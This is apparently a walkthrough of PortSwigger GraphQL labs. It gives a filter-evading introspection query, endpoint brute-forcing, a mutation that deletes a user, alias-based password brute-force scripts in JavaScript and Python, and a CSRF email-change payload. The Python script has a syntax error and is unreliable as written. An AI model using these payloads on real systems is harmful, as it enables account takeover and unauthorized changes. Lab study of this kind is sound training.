## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **GraphQL API Vulnerabilities**:

**2 Accidental exposure of private GraphQL fields**  
<blockquote>
  This lab demonstrates how attackers can enumerate GraphQL schema and access fields that should not be exposed to unauthorized users.
</blockquote>
  
**3 Finding a hidden GraphQL endpoint** 
<blockquote>
 This lab shows techniques to discover undisclosed GraphQL API endpoints that may not be directly linked or documented.
</blockquote>

**4 Bypassing GraphQL brute force protections**  
<blockquote>
    This lab demonstrates methods for bypassing brute-force protection mechanisms implemented in GraphQL APIs.
</blockquote>

**5 Performing CSRF exploits over GraphQL**  
<blockquote>
  This lab shows how attackers can exploit CSRF vulnerabilities via GraphQL queries to perform unauthorized actions on behalf of users.
</blockquote>
---

### LAB 2 - Accidental exposure of private GraphQL fields

### Lab Description

<img width="847" height="332" alt="image" src="https://github.com/user-attachments/assets/b22ca711-3c6d-485c-86c1-cb2cf7b1cdbf" />

### Solution


Login as wiener

<img width="1115" height="553" alt="image" src="https://github.com/user-attachments/assets/978c75b5-70e0-4ac3-84de-800b626cd7a9" />



Burp catches the following POST request to `/graphql/v1:`

First we look at all the id and we notice there is no id missing.


<img width="1624" height="764" alt="image" src="https://github.com/user-attachments/assets/a916775d-6275-4739-b3a4-19b123b23053" />




Now we change our email and we can 

<img width="934" height="422" alt="image" src="https://github.com/user-attachments/assets/b8b1b1fb-3755-4958-a2f2-1ca150c9685e" />


And we can see that changing email has following POST request to `/graphql/v1`:

<img width="1351" height="481" alt="image" src="https://github.com/user-attachments/assets/cc144654-dcff-4527-aeb9-02d9512ab796" />


As the URL name already suggests this is a GraphQL endpoint. The display of the request can be beautified with the recommended “InQL” Burp Plugin:

<img width="1350" height="470" alt="image" src="https://github.com/user-attachments/assets/03260c21-cbd6-464a-be77-f2760cab2d70" />


When I start with the initial analysis of a GraphQL endpoint I send the following query to list the names of the types being used:
```
{"query": "{__schema{types{name,fields{name}}}}"}
```
<img width="1207" height="575" alt="image" src="https://github.com/user-attachments/assets/41864b95-bc97-48bb-baa1-980b6d5f5d24" />



The endpoint responds with the following:
<img width="519" height="618" alt="image" src="https://github.com/user-attachments/assets/edcb1ff4-f14f-4d24-8bb2-7cd866fffa4b" />


Countine for above image
```json
    [
  {
    "name": "Boolean",
    "fields": null
  },
  {
    "name": "ChangeEmailInput",
    "fields": null
  },
  {
    "name": "ChangeEmailResponse",
    "fields": [
      {
        "name": "email"
      }
    ]
  },
  {
    "name": "Int",
    "fields": null
  },
  {
    "name": "LoginInput",
    "fields": null
  },
  {
    "name": "LoginResponse",
    "fields": [
      {
        "name": "token"
      },
      {
        "name": "success"
      }
    ]
  },
  {
    "name": "String",
    "fields": null
  },
  {
    "name": "Timestamp",
    "fields": null
  },
  {
    "name": "User",
    "fields": [
      {
        "name": "id"
      },
      {
        "name": "username"
      },
      {
        "name": "password"
      }
    ]
  },
  {
    "name": "__Directive",
    "fields": [
      {
        "name": "name"
      },
      {
        "name": "description"
      },
      {
        "name": "isRepeatable"
      },
      {
        "name": "locations"
      },
      {
        "name": "args"
      }
    ]
  },
  {
    "name": "__DirectiveLocation",
    "fields": null
  },
  {
    "name": "__EnumValue",
    "fields": [
      {
        "name": "name"
      },
      {
        "name": "description"
      },
      {
        "name": "isDeprecated"
      },
      {
        "name": "deprecationReason"
      }
    ]
  },
  {
    "name": "__Field",
    "fields": [
      {
        "name": "name"
      },
      {
        "name": "description"
      },
      {
        "name": "args"
      },
      {
        "name": "type"
      },
      {
        "name": "isDeprecated"
      },
      {
        "name": "deprecationReason"
      }
    ]
  },
  {
    "name": "__InputValue",
    "fields": [
      {
        "name": "name"
      },
      {
        "name": "description"
      },
      {
        "name": "type"
      },
      {
        "name": "defaultValue"
      },
      {
        "name": "isDeprecated"
      },
      {
        "name": "deprecationReason"
      }
    ]
  },
  {
    "name": "__Schema",
    "fields": [
      {
        "name": "description"
      },
      {
        "name": "types"
      },
      {
        "name": "queryType"
      },
      {
        "name": "mutationType"
      },
      {
        "name": "directives"
      },
      {
        "name": "subscriptionType"
      }
    ]
  },
  {
    "name": "__Type",
    "fields": [
      {
        "name": "kind"
      },
      {
        "name": "name"
      },
      {
        "name": "description"
      },
      {
        "name": "fields"
      },
      {
        "name": "interfaces"
      },
      {
        "name": "possibleTypes"
      },
      {
        "name": "enumValues"
      },
      {
        "name": "inputFields"
      },
      {
        "name": "ofType"
      },
      {
        "name": "specifiedByURL"
      }
    ]
  },
  {
    "name": "__TypeKind",
    "fields": null
  },
  {
    "name": "mutation",
    "fields": [
      {
        "name": "login"
      },
      {
        "name": "changeEmail"
      }
    ]
  },
  {
    "name": "query",
    "fields": [
      {
        "name": "getBlogPost"
      },
      {
        "name": "getAllBlogPosts"
      },
      {
        "name": "getUser",
        "_comment": "IMPORTANT: getUser function"
      }
    ]
  }
]

```

This response shows, that there is this query **“getUser”**. Furthermore there is **“User”** with the following fields:

We can also used InQl scanner to identfy mutaion and query as we can see  in below image that 
using the InQL scanner, we got know there are three queries in the schema and one query is to get the user details

<img width="1063" height="459" alt="image" src="https://github.com/user-attachments/assets/7477c6bf-94ad-4463-a4f4-f42008eacc94" />



Now, we can use this query to send to the endpoint to retrieve user information. But, you need an **user id to retrieve** the details.
It is not obvious but, from **looking at the solution we can know that the admin user id is 1**, we can also fuzz it if we donot knew id
Now send any request using the `/graphql/v1` endpoint to the Burp Repeater and move to the InQL tab inside it.

Now click on right tab and send it to repeater

<img width="1271" height="417" alt="image" src="https://github.com/user-attachments/assets/d5b7bf4a-9e3c-4123-b654-f2ddb194747d" />


As we can see in below image we have got query in repeater we willvchange id to 1 and paste it in change email `graphql/v1` which belong to user query
And admin id is  1,So it will give us **admin username and password**,then login through credential delete carlos and lab is solved 

<img width="1181" height="327" alt="image" src="https://github.com/user-attachments/assets/bc9d5252-cbf6-47a7-98aa-a28281bdf9b3" />



As we can see in below image we have cut all the email change functionality and paste above query and change `id to 1` and we will get id 1 
username and password which was admin


<img width="1335" height="459" alt="image" src="https://github.com/user-attachments/assets/3e41be0a-54c3-4e4d-88cf-0b524ed6e326" />


Now login as  admin using above credentials


<img width="1284" height="479" alt="image" src="https://github.com/user-attachments/assets/5c9e57b9-31cf-4caa-9994-e36ae100f5eb" />




---

### LAB 3 - Finding a hidden GraphQL endpoint

### Lab Description

<img width="852" height="358" alt="image" src="https://github.com/user-attachments/assets/d7dbc1db-a473-4f90-ace4-9b4f69daa45e" />

### Solution

By navigating to different blog we can see that there is no **graphql** request and we have get request from home,So we try to `brute force` Get request 
Endpoint


<img width="1614" height="618" alt="image" src="https://github.com/user-attachments/assets/a18369e3-14f3-4dd8-9a6e-12076dcc9a47" />




Now we have send above get request to intruder and used this wordlist  `https://gist.githubusercontent.com/7h3h4ckv157/20266e2567b70d6b0af261cfc7d8939c/raw/e151ff7a81f4265237631da4f2e651a35e117c29/GraphQL%20Endpoints` 
  for brute force endpoint or You can find more complete list on **SecLists**.



<img width="1249" height="671" alt="image" src="https://github.com/user-attachments/assets/82b81e35-785b-4f57-94fe-81f7a43b5fb6" />


We can see that **api** has **400** response remaning endpoint have different resposne,So **400** might be valid endpoint.

<img width="1321" height="988" alt="image" src="https://github.com/user-attachments/assets/d4dfad9d-6e41-4474-923c-23794c169fc5" />


The result of the brute force shows that one of the payloads has a status of 400, namely “API.”


When transferred to the repeater and looking at the response, we can conclude that `“API”` is a hidden GraphQL endpoint. 
However, the response requires a query to display the information from the `“GET”` request method

<img width="1476" height="613" alt="image" src="https://github.com/user-attachments/assets/6dc521bf-7aa8-4200-b088-30d7df0d28d3" />



hus, the query will be sent as a parameter of the URL.
Let’s try with this query: `/api?query=query{__typename}`

The response shows that the query was sent successfully by displaying the queried information.



<img width="1346" height="566" alt="image" src="https://github.com/user-attachments/assets/935bd76a-f232-4a0c-b150-361c1e817af3" />




<img width="1780" height="568" alt="image" src="https://github.com/user-attachments/assets/70c5b5f4-05eb-4b8c-b0a2-2c388cda9d64" />



”message”: “GraphQL introspection is not allowed, but the query contained **__schema** or **__type**”
GraphQL introspection on your target (if enabled):



<img width="1826" height="747" alt="image" src="https://github.com/user-attachments/assets/c05a6cae-47c8-41d2-947b-a6950eb2ff60" />




So I have try GraphQL introspection on your target (if enabled):

Command:


   `query IntrospectionQuery{       __schema
 {
      queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type   {kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}`

<img width="1883" height="596" alt="image" src="https://github.com/user-attachments/assets/cdf4f122-c66e-4280-8877-7028d3a2d328" />



I learned the same from: 🔗 [YesWeHack’s-Blog](https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty)
So, I just tried to bypass the defense by using many tactics but didn’t work! Later I convert the query to URL encoding & the payload works!

Command:

`++%20query+IntrospectionQuery%7B+++++++__schema%0a+%7B%0D%0A++++++queryType%7Bname%7DmutationType%7Bname%7DsubscriptionType%7Bname%7Dtypes%7B...FullType%7Ddirectives%7Bname%20description%20locations%20args%7B...InputValue%7D%7D%7D%7Dfragment%20FullType%20on%20__Type%7Bkind%20name%20description%20fields%28includeDeprecated%3Atrue%29%7Bname%20description%20args%7B...InputValue%7Dtype%7B...TypeRef%7DisDeprecated%20deprecationReason%7DinputFields%7B...InputValue%7Dinterfaces%7B...TypeRef%7DenumValues%28includeDeprecated%3Atrue%29%7Bname%20description%20isDeprecated%20deprecationReason%7DpossibleTypes%7B...TypeRef%7D%7Dfragment%20InputValue%20on%20__InputValue%7Bname%20description%20type%7B...TypeRef%7DdefaultValue%7Dfragment%20TypeRef%20on%20__Type+++%7Bkind%20name%20ofType%7Bkind%20name%20ofType%7Bkind%20name%20ofType%7Bkind%20name%20ofType%7Bkind%20name%20ofType%7Bkind%20name%20ofType%7Bkind%20name%20ofType%7Bkind%20name%7D%7D%7D%7D%7D%7D%7D%7D`


<img width="1837" height="790" alt="image" src="https://github.com/user-attachments/assets/e5d726d6-7c2a-4902-a3a6-803dcee4481c" />




The response now includes full introspection details. The reason is the server is configured to exclude queries matching the **“__schema{“ regex**, which the query no longer matches even though it is still a valid introspection query.
Find the **“getuser”** query from the result, then create a query request form with an encoded URL to be sent as a parameter URL.

<img width="1728" height="740" alt="image" src="https://github.com/user-attachments/assets/5edcfbb0-9a74-4715-bc4d-ce359b55e5b7" />


Next, use query introspection once again to find the user delete query.


<img width="695" height="815" alt="image" src="https://github.com/user-attachments/assets/e7f33820-b47b-43cd-91bf-56e596a836c4" />

<img width="1417" height="739" alt="image" src="https://github.com/user-attachments/assets/3d26148d-a286-4587-ad01-2e4c29a09868" />


So I save introspection response body as a JSON file.and analyze it by burpsuite community

<img width="1877" height="169" alt="image" src="https://github.com/user-attachments/assets/a3d14bba-900e-43f3-9a8e-27aa45bd5a7b" />


In **InQL** Scanner I scan the saved file & I found this
 
**Mutation** is a type of query used to modify data on the server. While queries are used for reading data, mutations are used for writing or modifying data. Mutations allow clients to make changes to the data stored on the server, such as creating, updating, or deleting records.

<img width="1270" height="457" alt="image" src="https://github.com/user-attachments/assets/96dfec9d-c6a1-4b85-9292-0f2836128fa2" />



The same was passed in GET request just change user input to {`id:1334`} to tell sever what id to delete

<img width="971" height="719" alt="image" src="https://github.com/user-attachments/assets/1ed9c743-ee3f-42a8-ae84-c2416befa3c8" />



As we can see below user doesnot exit because we pass id `1334` which no user has that id lets try `1,2,3`


<img width="501" height="299" alt="image" src="https://github.com/user-attachments/assets/01a78e22-b4ab-46f9-b2d4-12ef909a9898" />



Now we used `id:1`

<img width="957" height="609" alt="image" src="https://github.com/user-attachments/assets/38490297-8bd9-49b3-be91-a434361d1526" />


We can see that `id:1` belongs to admin and we cannot delete that.


<img width="1636" height="472" alt="image" src="https://github.com/user-attachments/assets/640914a0-5e43-49cf-9df4-0aa7770b3e80" />



But when we pass `id:3` which belong to carlos and it will delete carlos and lab is solved


<img width="1296" height="520" alt="image" src="https://github.com/user-attachments/assets/d6c97095-0b97-49ad-b958-5b06974a3423" />


lab is solved

<img width="1647" height="330" alt="image" src="https://github.com/user-attachments/assets/feaa33dd-a8a7-4273-8e3c-708e96ba3bc4" />

---

### LAB 4 - Bypassing GraphQL brute force protections

### Lab Description

<img width="569" height="175" alt="image" src="https://github.com/user-attachments/assets/2e801a21-2511-406d-b7fa-b5adca2319bc" />

## Tip: Automate GraphQL Login Brute-Force Using Aliases

This lab requires you to craft a **large GraphQL request** that uses **aliases** to send multiple login attempts simultaneously. Because this request can be time-consuming to construct manually, it's recommended to use a script to build it.

## How to Use the Provided Script

1. **Open the lab** in **Burp's browser**.
2. **Right-click** on the page and select **Inspect**.
3. Navigate to the **Console** tab.
4. **Paste** the script below and press **Enter**.
5. The list of aliases will be **copied to your clipboard**, ready to paste into **Burp Repeater**.

## JavaScript Snippet

```javascript
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));
console.log("The query has been copied to your clipboard.");
````

You can now paste the generated aliases into your **GraphQL query body** within **Burp Repeater** to test multiple passwords at once.



### Solution

We randomly add password **peter** and username **peter** and intercept request and We see that it uses `/graphql/v1` endpoint to send request to server

<img width="1794" height="610" alt="image" src="https://github.com/user-attachments/assets/0f983175-4ea9-435e-ae3e-9d32153cd785" />


We want to brute for carlos password but when we do **3** attempts,We see that
It is giving us error try again in **three minutes**,So to bypass it we will used alias

An alias is used to rename the result of a field in the response. This can be particularly useful when you 
have multiple fields with the same name but need to distinguish between them in the response.


<img width="1601" height="573" alt="image" src="https://github.com/user-attachments/assets/33cf87ef-0237-444d-8621-72a9d1733af2" />


Here is the request that being sent to the target.

<img width="1465" height="545" alt="image" src="https://github.com/user-attachments/assets/a7ce9c35-84d7-4aa1-9acd-0ec6a0eb2a64" />


If you use GraphQL extension, you will be seeing something like this: 
**Username =peter** in our case

<img width="545" height="435" alt="image" src="https://github.com/user-attachments/assets/c731b021-e215-4be0-a57d-924e0da88966" />


So, we have a mutation and a variable.

We will create  python script to create alias like we neededin above scnerio to bypass passworf limit,
To get the password of carlos
**Note**:password are already provided to us


**Note**: passwords are already provided to us


```python
passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "football",
    # ... paste the full list from https://portswigger.net/web-security/authentication/auth-lab-passwords here
    # There are usually ~100 common passwords in the lab list
]

print("{% raw %}")
print("```graphql
print("mutation BruteForceCarlos {")

for i, pwd in enumerate(passwords, 1):
    print(f"  attempt{i}: login(input: {{ username: \"carlos\", password: \"{pwd}\" }}) {{")
    print("    success")
    print("    token")
    print("  }")

print("}")
print("```")
print("{% endraw %}")
```


We have run script in reptile and we have get the payload

<img width="1350" height="554" alt="image" src="https://github.com/user-attachments/assets/9476cf04-c6cc-44c4-9302-42dd02696140" />


but do not forget to add mutation { payload }


Now  paste it in graphql and we can see that we have correct pasword hunter 

<img width="1480" height="773" alt="image" src="https://github.com/user-attachments/assets/935fd4d1-fe36-443a-b934-e386c646d7b9" />


Now login as carlos and lab is solved


<img width="1511" height="578" alt="image" src="https://github.com/user-attachments/assets/320fb5e0-86e2-49f9-b29f-a5d5d382e98e" />



---

### LAB 5 - Performing CSRF exploits over GraphQL

### Lab Description

<img width="906" height="445" alt="image" src="https://github.com/user-attachments/assets/676788c8-04f2-4e15-bc4d-bf9d50e5050a" />

### Solution

In Burp, go to **Proxy > HTTP history** and check the resulting request. Note that the email change is sent as a GraphQL mutation.
Right-click the email change request and select **Send to Repeater**.


<img width="1404" height="537" alt="image" src="https://github.com/user-attachments/assets/461fd126-4a02-499c-948d-5815d5846c7c" />



In Repeater, **amend** the GraphQL query to change the email to a second different address.
Click **Send**.
In the response, notice that the email has changed again. This indicates that you can reuse a session cookie to send multiple requests.
Convert the request into a POST request with a `Content-Type` of `x-www-form-urlencoded`. To do this, right-click the request and select Change request method twice.


<img width="1479" height="615" alt="image" src="https://github.com/user-attachments/assets/de653564-9bd5-4c57-b299-e909ea4655b4" />

<img width="1197" height="443" alt="image" src="https://github.com/user-attachments/assets/5fae49a4-645f-4425-96af-69b7d0504cc5" />


Notice that the mutation request body has been deleted. Add the request body back in with URL encoding.
The body should look like the below:

`query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D`


<img width="1328" height="463" alt="image" src="https://github.com/user-attachments/assets/fa113c3f-8efe-4b60-b691-c6435b02bccd" />


 So I Have no professional burp in in linux so copy request and paste it professional burp to generate csrf poc



<img width="1780" height="987" alt="image" src="https://github.com/user-attachments/assets/0049c11e-e931-4d65-a761-c1d6be392b05" />

 

We have notice url given by csrf html poc is worng ,So we change it with  the url which is our lab

<img width="935" height="142" alt="image" src="https://github.com/user-attachments/assets/c65b73ad-0e58-42df-a7fd-cba73f8c2aa1" />


Store and deliver to victum and lab is solved


<img width="1431" height="697" alt="image" src="https://github.com/user-attachments/assets/f446c186-d25d-416d-be5a-4641646e51c5" />



---




